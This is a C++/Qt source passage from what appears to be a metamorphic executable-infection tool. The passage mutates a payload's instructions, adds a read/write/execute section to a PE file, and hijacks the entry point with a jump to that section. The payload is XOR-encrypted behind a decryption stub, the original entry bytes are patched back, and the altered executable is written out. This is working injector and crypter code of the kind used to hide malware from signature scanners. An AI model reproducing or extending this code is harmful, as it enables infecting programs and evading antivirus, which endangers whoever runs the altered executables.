    alternative_inc_or_dec_instruction(this->dis_asm_vec,
                           this->machine_code_vec,
                           this->machine_code_num_of_bytes);
    alternative_sub_instruction(this->dis_asm_vec,
                                this->machine_code_vec,
                                this->machine_code_num_of_bytes);
    alternative_add_instruction(this->dis_asm_vec,
                                this->machine_code_vec,
                                this->machine_code_num_of_bytes);
    alternative_xor_clear_instruction(this->dis_asm_vec,
                            this->machine_code_vec,
                            this->machine_code_num_of_bytes);
    alternative_xor_general_instruction(this->dis_asm_vec,
                                        this->machine_code_vec,
                                        this->machine_code_num_of_bytes);
    alternative_and_instruction(this->dis_asm_vec,
                                this->machine_code_vec,
                                this->machine_code_num_of_bytes);
    alternative_push_instruction(this->dis_asm_vec,
                                 this->machine_code_vec,
                                 this->machine_code_num_of_bytes);
    alternative_pop_instruction(this->dis_asm_vec,
                                this->machine_code_vec,
                                this->machine_code_num_of_bytes);
	
	//put all the new alt instructions into the payload vector
    modify_payload_vec_with_alternative_instructions(this->payload_vec,this->dis_asm_vec);

    this->dis_asm_vec.clear();
    this->morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);

    error_warning_message_box(this->morph_status);
    if(this->morph_status.contains("ERROR") == true)
    {
        return this->morph_status;
    }

    this->disassembly_log += concat_disassembly(this->dis_asm_vec,this->morphed_exe_name + QString(" : PAYLOAD AFTER MORPHING"));//for disassembly


    //=========================================================================================

    //setting the full file path
    set_morphed_exe_file_path(exe_file_path);

    this->payload_num_of_bytes = 0x400;//cannot be too big if not affect file size
	
    //calculate the file alignment factor to align the section
    calculate_file_alignment_factor(this->payload_num_of_bytes,this->file_alignment,this->file_alignment_factor);

    //calculate the payload raw data size via file_alignment
    this->payload_raw_data_size = this->file_alignment_factor * this->file_alignment;

    //calculate the section alignment factor for the section
    //needs the virtual size of the section before the payload section for calculation
    calculate_section_alignment_factor(payload_num_of_bytes,section_alignment,section_alignment_factor,
                                       image_section_header_vec[index_of_payload_section-1]);

    //calculate payloads virtual size via section alignment
    this->payload_virtual_size = this->section_alignment_factor * this->section_alignment;

    //calculate payloads raw address
    //previous raw size + previous raw data offset
    this->payload_raw_address = image_section_header_vec[index_of_payload_section-1]->SizeOfRawData
                                + image_section_header_vec[index_of_payload_section-1]->PointerToRawData;



    //calculate the payloads va
    //previous virtual address + payloads virtual size
    this->payload_virtual_address = image_section_header_vec[index_of_payload_section-1]->VirtualAddress
                                    + this->payload_virtual_size;



    //setting the relevant values in the new payload section header via payload_section_header_ptr
    init_payload_section_header(this->payload_section_header_ptr,
                                this->payload_raw_address,
                                this->payload_raw_data_size,
                                this->payload_virtual_address,
                                this->payload_virtual_size,
                                this->SECTION_CHARACTERISTICS_TO_SET);

    //setting the new size of the pe file
    //via image_NT_header_ptr by adding on the payload_virtual_size
    this->image_NT_header_ptr->OptionalHeader.SizeOfImage += this->payload_virtual_size;

    //this is the section pivot gadget for the payload section,
    //which is used to patch back the .text section
    //currently this value is when the PE is loaded, hence we add the raw data offset of the text section
    this->starting_of_text_section_offset_on_load = this->image_NT_header_ptr->OptionalHeader.AddressOfEntryPoint -
                                    this->image_NT_header_ptr->OptionalHeader.BaseOfCode +
                                    this->text_section_raw_data_offset;

    //getting image base via image_NT_header_ptr optional header
    this->image_base = this->image_NT_header_ptr->OptionalHeader.ImageBase;

    //generating a random key for encryption scheme
    this->random_key = generate_random_key();

    unsigned int length_of_random_key = sizeof(random_key);


    //getting the start of the payload section, which is image base + payload virtual size
    this->start_of_payload_section_offset = this->image_base + this->payload_virtual_address;


    std::cout << " THE PAYLOADS OFFSET: " << convert_num_to_hex<DWORD>(start_of_payload_section_offset) << std::endl;

    //writing assembly syntax, for jumping to payload section (section pivot gadget), into string.
    //since random key is stored in the first byte, the offset needs to + the length of the random key
    std::string jump_to_payload_asm = "mov ecx, ";
    jump_to_payload_asm += convert_num_to_hex<DWORD>(this->start_of_payload_section_offset + length_of_random_key) + ";";
    jump_to_payload_asm += "jmp ecx;";
    this->machine_code_vec.clear(); //clear vector to input new machine code

    //and converting assembly syntax into machine code
    this->morph_status = asm_to_machine_code(jump_to_payload_asm,this->machine_code_vec,this->machine_code_num_of_bytes);
    error_warning_message_box(this->morph_status);

    if(this->morph_status.contains("ERROR") == true)
    {
        return this->morph_status;
    }

    //storing the byte length of the section pivot gadget
    this->jump_to_payload_byte_length = this->machine_code_num_of_bytes;

    //putting original text section data into a pointer, to be added into the buffer later
    this->text_section_buffer_original = get_section_data_from_buffer(this->buffer,
                                                                      this->text_section_raw_data_offset,
                                                                      this->size_of_text_section);
    //storing the original text section into a pointer, for calculation
    this->text_section_buffer_ptr = this->text_section_buffer_original;


    //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
    //will be used to put into the actual buffer later
    //starting_of_text_section_offset_on_load must subtract by the text_section_raw_data_offset
    //to get to the physical memory of the buffer
    editing_text_section_ptr(this->text_section_buffer_ptr,
                             this->jump_to_payload_byte_length,
                             this->starting_of_text_section_offset_on_load - this->text_section_raw_data_offset,
                             this->machine_code_vec);


    //stores the payload into a variable char* and the ptr is to do calculation
	char *payload_section_buffer_original = new char[this->payload_raw_data_size]{ 0 };
    char *payload_section_buffer_ptr = payload_section_buffer_original;


    //to store the bytes after the decryption instruction bytes
    //so we can populate the rest in one pass
    std::vector<unsigned char> bytes_after_decryption_instructions_vec;

    //we need to store the payload entry point address into edi, so that stosd will work as intended
    //safe practice, incase edi was used or modified previously
    std::string store_payload_entry_point_in_edi_asm = "";
    store_edi(store_payload_entry_point_in_edi_asm,this->entry_point_of_text_section);
    this->machine_code_vec.clear();
    asm_to_machine_code(store_payload_entry_point_in_edi_asm,
                        this->machine_code_vec,this->machine_code_num_of_bytes);

    //adding the mov edi instructions into the vector
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);

    //here we memorize the original bytes of the text section
    //this will be used in the payload section to patch back the overwritten text section bytes
    std::string text_section_memorized_entry_bytes = "";

    //stosd can only store a certain amount of dwords
    //this is to calculate how many stosd we need
    //storing the original entry bytes from the buffer to text_section_memorized_entry_bytes
    calculate_num_of_stosd_for_patching(text_section_memorized_entry_bytes,
                                        this->num_of_stosd,
                                        this->jump_to_payload_byte_length,
                                        this->starting_of_text_section_offset_on_load,
                                        this->buffer);



    //getting the stosd instructions asm, afew calculations must be done for big to little endian conversion
    std::string patching_entry_bytes_asm = "";
    get_stosd_instruction_asm(patching_entry_bytes_asm,
                              text_section_memorized_entry_bytes,
                              this->num_of_stosd);

    //converting patching_entry_bytes_asm to machine code
    this->machine_code_vec.clear();
    asm_to_machine_code(patching_entry_bytes_asm,this->machine_code_vec,
                        this->machine_code_num_of_bytes);

    std::cout << " THE PAYLOADS OFFSET + PATCHING ENTRY: " <<
                 convert_num_to_hex<DWORD>(start_of_payload_section_offset + machine_code_num_of_bytes) << std::endl;

    //adding the patching_entry_bytes_asm instructions into the vector
    //currently has mov edi instructions + this patching_entry_bytes_asm
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);

    //adding the payload instructions into the vector
    //currently has mov edi instructions + patching_entry_bytes_asm + this payload instructions
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->payload_vec);

    //getting the asm instructions to jump back to the text section
    std::string jump_back_to_text_section_asm = "";
    get_jump_back_to_text_section_instruction_asm(jump_back_to_text_section_asm
                                                  ,this->entry_point_of_text_section);

    //converting the above asm instructions to machine code
    machine_code_vec.clear();
    asm_to_machine_code(jump_back_to_text_section_asm,this->machine_code_vec,
                        this->machine_code_num_of_bytes);

    //adding the jump back to text section instructions into the vector
    //currently has mov edi instructions + patching_entry_bytes_asm + payload instructions
    // + this jump back to text section instructions
    add_bytes_into_vec(bytes_after_decryption_instructions_vec,this->machine_code_vec);

    //encrypting contents of the vector, by xor with the random key
    encrypt_bytes_after_decryption_instruction_vec(bytes_after_decryption_instructions_vec,this->random_key);

    // ================== START HERE FOR DECRYPTION SCHEME ================================
    std::cout << "CMP EAX, instruction: " << bytes_after_decryption_instructions_vec.size() << std::endl;
    std::string decrypt_asm = "";
    get_decryption_asm(decrypt_asm,
                       this->start_of_payload_section_offset,
                       length_of_random_key,
                       this->machine_code_vec,
                       this->machine_code_num_of_bytes,
                       bytes_after_decryption_instructions_vec.size());

    std::vector<unsigned char> decryption_vec;

    for(int i = 0; i < machine_code_vec.size(); i++)
    {
        decryption_vec.emplace_back(machine_code_vec[i]);
    }

    //putting a random key into the beginning of the payload section
    add_random_key_to_payload_section_buffer_ptr(payload_section_buffer_ptr, this->random_key);


    //adding in the decryption routine into payload_section_buffer_ptr
    //(this->machine_code_vec.data()) contains the decryption routine
    populate_section_ptr(payload_section_buffer_ptr,
                         reinterpret_cast<char*>(decryption_vec.data()),
                         decryption_vec.size());


    //putting in the jump back to text section into payload_section_buffer_ptr
    populate_section_ptr(payload_section_buffer_ptr,
                         reinterpret_cast<char*>(bytes_after_decryption_instructions_vec.data()),
                         bytes_after_decryption_instructions_vec.size());


    //===================================================================================

    rewrite_bytes_to_buffer(this->buffer, (char*)this->dos_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_DOS_HEADER));
    //replacing back the edited image_NT_header_ptr into the buffer
    //number of sections was increased by 1
    //new size of the pe file was set
    //by adding the payload_virtual_size to SizeOfImage
    this->buffer_cursor = this->exe_header_file_offset;
    rewrite_bytes_to_buffer(this->buffer, (char*)this->image_NT_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_NT_HEADERS32));

    //need to be used to find the payload section later
    unsigned int start_of_section_headers_offset = this->buffer_cursor + sizeof(IMAGE_NT_HEADERS32);

    //need to add the cursor + the size of IMAGE_NT_HEADERS32 + the index_of_text_section * size of IMAGE_SECTION_HEADER
    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER));
    //this->buffer_cursor += this->index_of_text_section * sizeof(IMAGE_SECTION_HEADER);
    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));

    //putting in the new payload section header
    //payload raw address is previous raw size + previous raw data offset
    //payload raw data size was calculated via file_alignment
    //payload virtual size is calculated via section alignment
    //payload virtual address is previous virtual address + payloads virtual size
    //payload characteristics is set to read/write/execute
    this->buffer_cursor = start_of_section_headers_offset + (this->index_of_payload_section * sizeof(IMAGE_SECTION_HEADER));
    rewrite_bytes_to_buffer(this->buffer, (char*)this->payload_section_header_ptr,
                            this->buffer_cursor,sizeof(IMAGE_SECTION_HEADER));

    //need to resize buffer to accomodate the new payload section
    __int64 new_buffer_size = this->buffer.size() + this->payload_raw_data_size;
    this->buffer.resize(new_buffer_size);

    //start at the payload_section_header_ptr pointer to raw data
    //putting in the payload into buffer
    this->buffer_cursor = this->payload_section_header_ptr->PointerToRawData;
    rewrite_bytes_to_buffer(this->buffer, (char*)payload_section_buffer_original,
                            this->buffer_cursor,this->payload_raw_data_size);

    this->buffer_cursor = this->text_section_raw_data_offset;
    rewrite_bytes_to_buffer(this->buffer, (char*)this->text_section_buffer_original,
                            this->buffer_cursor,this->size_of_text_section);


    //free memory
    delete[] payload_section_buffer_original;
    payload_section_buffer_ptr = nullptr;
    delete payload_section_buffer_ptr;

    //writing to file
    if(this->morph_status.contains("ERROR") == false)
    {
        this->morph_status = SUCCESS_MORPHED_EXECUTABLE;
        write_exe_file(this->morphed_exe_file_path, this->buffer);
    }

    QDateTime end = QDateTime::currentDateTime();
    this->elapsed_time = start.msecsTo(end);

    return this->morph_status;
}

qint64 Morph_Executable_Controller::get_elapsed_time()
{
    return this->elapsed_time;
}

void Morph_Executable_Controller::set_elapsed_time(qint64 elapsed_time)
{
    this->elapsed_time = elapsed_time;
}

QString Morph_Executable_Controller::get_analysis_textbox_status()
{
    return cur_wind->get_text_analysis_textbox();
}

void Morph_Executable_Controller::set_analysis_textbox_status(QString status)
{
    this->cur_wind->set_text_analysis_textbox(status);
}

void Morph_Executable_Controller::update_analysis_textbox(QString analysis_textbox_status,
                                                          qint64 elapsed_time,
                                                          QString morph_status)
{
    this->cur_wind->ui->tabWidget->setCurrentIndex(1);//switch to analysis tab

        QString previous_text_from_analysis = analysis_textbox_status;

        QDateTime current = QDateTime::currentDateTime(); // to get the current time and day

        const QString stars = QString("******************************************************\n");
        QString format;

        format += previous_text_from_analysis;
        format += stars;
        format += QString("MORPHED STATUS AT : ") +  current.toString() + QString("\n");
        format += QString("ELAPSED TIME : ") + QString::number(elapsed_time) + QString(" ms") + QString("\n\n\n");

        if(morph_status == SUCCESS_MORPHED_EXECUTABLE)
        {
            format +=  QString("Sucessfully Morphed") + QString("\n");
        }
        else
        {
            format += QString("Morphing Failed: ");
            format += morph_status + QString("\n");
        }

        format += stars + QString("\n\n");
        set_analysis_textbox_status(format);
}

//for disassembly log
QString Morph_Executable_Controller::concat_disassembly(std::vector<Disassembly> &dis_asm_vec, QString line_header)
{
    const QString line = QString("====================================================================================================================");

    int length_of_line = line.size();
    int length_of_line_header = line_header.size();
    int temp =   length_of_line - length_of_line_header;
    temp /= 2;

    std::stringstream result;
    result << line.toStdString() << std::endl;
    result << std::left << std::setw(temp) << "" << line_header.toStdString() << std::endl;
    result << line.toStdString() << std::endl;

    for(int i = 0; i < dis_asm_vec.size(); i++)
    {
        std::stringstream ss;
        ss << dis_asm_vec[i] << std::endl;
        result << ss.str();
    }
    result << line.toStdString() << std::endl << std::endl << std::endl;

    return QString(result.str().c_str());
}